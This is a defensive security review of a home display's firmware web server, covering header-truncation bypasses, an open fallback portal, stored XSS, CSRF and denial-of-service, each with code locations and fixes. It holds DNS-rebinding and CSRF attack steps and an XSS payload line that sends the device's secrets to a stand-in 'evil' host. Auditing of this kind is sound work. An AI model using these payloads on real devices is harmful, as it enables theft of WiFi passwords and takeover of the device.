# Security review of the MultiDisplay firmware (November 2026, 1.35.0)

**Angle:** an adversarial audit of the firmware in `main/` and `components/`, including the
embedded JS pages. **Threat model:**

- someone on the home LAN, or within WiFi range of the display;
- a web page opened in a browser on the LAN (CSRF and DNS rebinding);
- an upstream API that is malicious or has been taken over (MET, Entur, adsb.lol, Spotify,
  the update site);
- a hostile iCal feed;
- a hostile or spoofed Sonos speaker.

Known open items in `docs/improvements.md` are not repeated: TLS checking for MET/Yr/adsb.lol (#22),
the plain-text setup password (#53) and the 20 s screenshot hold (#52). Every finding below was
traced from where the input comes in to where it is used. I did not build or run anything.

Ratings are for a home device. The most serious problems need the **setup password to be unset**,
and it is optional.

---

## High

### H1. A long `Host` or `Origin` header gets past the Host check (#54) and the cross-site check (#26)

**Where:**
- `components/wifi_provision.c:832` (`host_ok`)
- `components/wifi_provision.c:966-968` (`same_origin`)

**What is wrong.** `httpd_req_get_hdr_value_str` returns `ESP_ERR_HTTPD_RESULT_TRUNC` when a value
does not fit the buffer (esp-idf `httpd_parse.c:1121`). Both checks treat any result other than
`ESP_OK` as "header absent", and absent means "let it through":

- **`host_ok`** reads `Host` into `char host[96]`. If Host is 97 characters or longer, it takes the
  "HTTP/1.0 without a Host: no browser" path and returns `true`.
- **`same_origin`** reads `Origin`, then `Referer`, into `char from[128]`. If both are 129
  characters or longer, both reads fail and it returns `true` ("curl without either").

`CONFIG_HTTPD_MAX_REQ_HDR_LEN=1024`, so such headers are accepted. A DNS name can be up to 253
characters, so the attacker controls these lengths.

**Attack 1: DNS rebinding reads the secrets (this undoes the fix for #54).**
1. A LAN user opens `http://<120-char-name>.evil.example/`.
2. The attacker's DNS then rebinds that name to the display's IP.
3. The page's script fetches `/config.json?hemmeligheter=1`. That request has the same origin as
   the page, and its long `Host` passes `host_ok`.
4. With no setup password, the reply comes back with the **home WiFi password** and the
   BarentsWatch secret.
5. The same way, it can read `/log`, `/status`, `/coredump` (a RAM image that holds every secret)
   and `/screen.png`.

**Attack 2: CSRF from any http:// page.**
1. The page is served from a host name of 121 characters or more. Its default referrer policy
   makes both `Origin` and `Referer` too long to fit.
2. A `fetch(..., {mode:'no-cors', method:'POST'})` to `http://<display-ip>/config.json` passes
   `same_origin`. The body can be a minimal backup:
   `{"format":…,"version":1,"wifi":{…},"updates":{"url":…}}`.
3. That one request can:
   - change the WiFi network;
   - set a setup password that locks the owner out (only BOOT undoes it);
   - point the update, report and radio addresses at the attacker;
   - plant the XSS in M2.
4. The same request works against:
   - `/save`;
   - `/ota` (a downgrade to any older signed release, since the upload accepts older versions on
     purpose);
   - `/ota/install`;
   - `/hendelser`;
   - `/coredump/erase`.

**What limits it.**
- With a setup password set, the `SameSite=Strict` cookie is not sent across sites, and the
  rebinding host gets no cookie at all.
- Chrome's Local Network Access prompt (2025 onward) blocks both attacks unless the user allows
  it. Firefox and Safari do not.
- Some routers filter private addresses out of DNS answers, which stops the rebinding variant.

**Fix.**
- Treat any result other than `ESP_OK` and `ESP_ERR_NOT_FOUND` as a refusal in `host_ok`,
  `same_origin` and every other header read used for a security decision.
- In `same_origin`, refuse a POST that has an `Origin`/`Referer` which could not be read, instead
  of treating it as missing.
- Add a host test with a 200-character Host and Origin.

**Confidence:** confirmed from the code and the esp-idf source.

---

## Medium

### M1. The fallback setup portal gives the home WiFi password to anyone nearby

**Where:**
- `components/wifi_provision.c:2249` (the AP is `WIFI_AUTH_OPEN`)
- `components/wifi_provision.c:1945` (`/config.json` is registered in the portal too)
- `components/wifi_provision.c:826-829` (`host_ok` lets everything through in the portal)

**What is wrong.** A display that is already set up opens the **open** AP `Værtavla-XXXX` when the
saved network does not answer within 45 s of boot (#1). The web server's built-in handlers,
including `GET /config.json?hemmeligheter=1`, are registered there as well. With no setup
password, anyone who joins the AP is let in.

**Scenario.**
1. After a power cut the router boots more slowly than the display, or the router is off during
   the nightly restart.
2. A neighbour or passer-by sees an open network. Their phone's captive-portal window shows the
   setup page.
3. A request to `http://192.168.4.1/config.json?hemmeligheter=1` returns the home WiFi SSID and
   password, and the BarentsWatch secret.
4. While someone stays connected, `portal_run` stops retrying the saved network
   (`wifi_provision.c:2280`). One phone left connected therefore keeps the display out of service
   indefinitely, even when a password is set.

Someone in radio range can also cause the outage on purpose, by jamming the display during its
boot.

**Fix.**
- Do not register `/config.json`, or at least the `hemmeligheter=1` variant, while `s_portal` is
  set unless `s_auth_bypass` (BOOT) is set. A fresh device has no secrets to protect, and an
  already set-up one should need BOOT or the password to export them.
- Consider protecting the fallback AP with WPA2, using a key shown on the screen.
- Cap how long a connected client can block the retry.

**Confidence:** confirmed.

### M2. Stored XSS on the setup page through the update address

**Where:**
- The sink: `components/wifi_provision.c:336` and `:356-362`. The output of
  `app_config_spotify_redirect(cfg->ota_url, ...)` is printed raw into `<code>%s</code>`.
- The sources:
  - `wifi_provision.c:1517-1519` (`otaurl` on `/save`, which only checks the `http(s)://` prefix);
  - `app_config_json.c:277-280` (the backup restore, which also only checks the prefix).
- `site_url` (`app_config.c:623-648`) keeps everything up to the last `/`.

**What is wrong.** All other copies of `ota_url` are escaped with `html_escape_append`; this one
is not. The address can be set through /save, through a backup restore, or through H1. An example:
`https://a/<script>fetch('/config.json?hemmeligheter=1').then(r=>r.text()).then(t=>fetch('//evil/'+btoa(t)))</script>/m.json`.
It is 200 characters at most (`APP_CONFIG_OTA_URL_MAX` is 201) and may not contain `?` or `#`.

**Scenario.**
1. The address is planted through H1, or through a backup file the owner is persuaded to restore.
2. The next time the owner opens `/oppsett`, logged in or not, the script runs on the display's
   origin with the owner's cookie.
3. It sends the WiFi password and every other secret away, and can make further changes. This
   works **even when a setup password is set**.

**Fix.**
- Pass `redirect` through `html_escape_append`.
- Also refuse `ota_url` values with characters outside RFC 3986 on both save paths.
- A `Content-Security-Policy: script-src 'self'` header on the pages would also stop inline
  scripts.

**Confidence:** confirmed.

---

## Low

### L1. GET requests that change state (CSRF through `<img>`, with no Origin check)

**Where:**
- `main/main.c:897-940` (`GET /screen?vis=N`, when "Tillat å velge skjerm over nettet" is ticked)
- `main/spotify.c:1175` (`GET /spotify/login`)

**What is wrong.** `h_added` checks the origin only on POST. A page anywhere can use
`<img src="http://multidisplay.local/screen?vis=3">` to switch screens, stop the rotation and light
a screen switched off for the night, as often as it likes. The second request replaces the stored
OAuth state and verifier, so a Spotify login in progress fails.

**Fix.** Make `/screen` switch only on POST (or with the same-origin check), and start the Spotify
login from a POST.

**Confidence:** confirmed. The `/screen` part needs screen control on and no setup password.

### L2. One LAN client can stall the whole web server

**Where:**
- esp-idf `httpd_parse_req` (a single httpd task)
- `main/report.c:266` (waits with `portMAX_DELAY` for a send that can take up to 30 s)
- `main/sonos_events.c:48-56` (an open NOTIFY endpoint)

**What is wrong.**
- **Slow headers:** a client that sends one header byte every 4 s keeps resetting the 5 s receive
  timeout. It can hold the only httpd task for hours (up to about 2.5 KB of headers).
- **Error reports:** each `/feil` POST blocks the server while the report is sent upstream.
- **Sonos events:** while the server is blocked, Sonos events time out and the screen falls back
  to polling.

The display itself carries on; the setup pages, navigation and screenshots stop answering.

**Fix.**
- Put a total deadline on reading a request, if a handler-level timeout or a custom `recv`
  wrapper allows it.
- Answer `/feil` at once with 202 and let the report task finish on its own.

**Confidence:** plausible. The httpd behaviour comes from the esp-idf source; I did not run it
against the device.

### L3. A hostile calendar feed can keep the weather task busy until the watchdog restarts the display

**Where:**
- `components/ical.c:19` (`PERIODS_MAX 200000`)
- `components/ical.c:413` (`expand`)
- `components/cal_client.c:15` (16 MB per feed)

**What is wrong.** Every event's rule is walked from its `DTSTART` up to the window, so
`DTSTART:19000101` with `FREQ=DAILY` costs about 46,000 periods. A shared or subscribed feed of a
few MB can hold tens of thousands of such events. Nothing in the calendar fetch beats the weather
watchdog, and the display has no budget for this work. The parse can therefore pass
`WD_WEATHER_MAX_S` (20 min) and restart the display. After the restart the same feed is fetched
again.

**Fix.**
- Jump `k` straight to the period of `from_day` when the rule has no `COUNT`, which is O(1) for
  DAILY, WEEKLY and MONTHLY.
- Cap the total number of periods expanded per feed.

**Confidence:** plausible. The cost per period on the chip was not measured.

### L4. The pace on wrong passwords is shared, so an attacker can keep the owner from logging in

**Where:** `components/wifi_provision.c:810-824`, `components/web_auth.c:89`

**What is wrong.** There is one `s_last_fail_us` for all clients. A LAN host that sends a wrong
Basic password about once a second keeps everyone else's login attempts at 429 or "Vent et
sekund". Browsers that already hold the cookie still get in. `web_auth_secret_equal` also returns
early when the lengths differ, which reveals the password's length. That matters little at one
guess a second.

**Fix.**
- Pace per client IP, using `httpd_req_to_sockfd` and `getpeername`.
- Compare an HMAC of both strings so the comparison takes the same time whatever the length.

**Confidence:** confirmed.

### L5. Any LAN device can pose as a Sonos speaker

**Where:**
- `components/sonos_client.c:150-158` (the first SSDP answer containing "Sonos" wins)
- `components/sonos_parse.c:272-285` (room IPs and cover URLs come from the reply)

**What is wrong.** A rogue device can answer discovery. It then decides:
- which IPs get the SOAP calls and the event subscriptions;
- which room names are shown;
- the cover URLs (any `http(s)://`), which the display fetches and decodes.

The parsing is bounded. The impact is false information on the screen, and the display fetching
URLs inside the LAN on the device's behalf.

**Fix.** Prefer the speaker that answered last time and check that rooms come from the same
household (`HouseholdId`). Fetch covers only from the speaker's own IP or from known hosts.

**Confidence:** confirmed. Impact is low.

---

## Checked and found sound

- **OTA:**
  - Both paths check the project name before writing, erase the slot including the signature
    sector, and verify the RSA signature in `esp_ota_end` before `set_boot_partition`.
  - The updater also requires the manifest's project and board, a version newer than the running
    one (and not the one just rolled back), the image's own embedded version to equal the
    manifest's, and the SHA-256 and size.
  - A compromised update site therefore cannot downgrade the display or install foreign code.
    Manual upload of older signed images is by design.
  - The signing key is in `.gitignore`.
- **PNG:**
  - The own decoder (`png_decode.c`, `png_inflate.c`) checks chunk lengths, header limits,
    palette indices and row and square bounds.
  - libpng is used for the satellite and rain images, with fixed sizes and the transforms that
    guarantee RGB8.
  - JPEG covers: dimensions are capped at 4000 and the output buffer size is checked.
- **Sonos XML/SOAP:** `find_elem`, `attr`, `copy_n` and the entity decoding (never longer than its
  input) are bounded. The favourites and queue are parsed item by item. The radio logo blob checks
  its offsets.
- **AIS and ADS-B scanners:** pointer-bounded, with clamped number copies. Token length is checked
  against `AIS_TOKEN_MAX`.
- **iCal parsing:** fuzzed earlier (#71/#72). Line and field limits hold, and the recurrence
  arithmetic is 64-bit.
- **Forms and query strings:**
  - `form_field` decodes within `dst_len` and keeps UTF-8 whole.
  - `read_small_body`, `SAVE_BODY_MAX` and `BACKUP_BODY_MAX` refuse bodies that are too large
    before reading them.
  - The OTA upload is bounded by the partition size.
- **Backup restore:** it is applied only if the whole backup is valid. Events go through
  `own_valid`, so there are no out-of-range `MONTH[]` indices, and string lengths are checked.
- **HTML and JS escaping:**
  - Everything on the setup, events and navigation pages except M2 goes through
    `html_escape_append`/`esc`.
  - `setup_page.js` and `nav_page.js` use `textContent`, or `E()` before `innerHTML`.
  - The WiFi scan is built with cJSON.
  - `next` after login is limited to `/` or `/oppsett`.
- **Secrets in output:**
  - `/status` and the error reports hold no secrets.
  - The boot log prints "set"/"missing" for the secrets.
  - Spotify and BarentsWatch error bodies are logged, but no tokens.
  - Calendar URLs are never logged.
  - The Spotify refresh token is not in backups.
  - `/coredump` does hold secrets but sits behind authentication.
- **Spotify OAuth:** PKCE, plus a random state that is used once. The `Host` folded into the state
  is checked character by character.
- **Error reports:** ECDSA signed. The multipart boundary is checked against a whitelist. The
  display's own fields come first. Everything is sent over TLS with the bundle.
- **Captive DNS:** packet bounds are checked before the answer is appended.
- **Login cookie:** HMAC of the password with a random key, `HttpOnly`, `SameSite=Strict`, and
  compared in constant time when the lengths match.
- **WiFi:** the station requires WPA2 or better for a saved password (`threshold.authmode`).
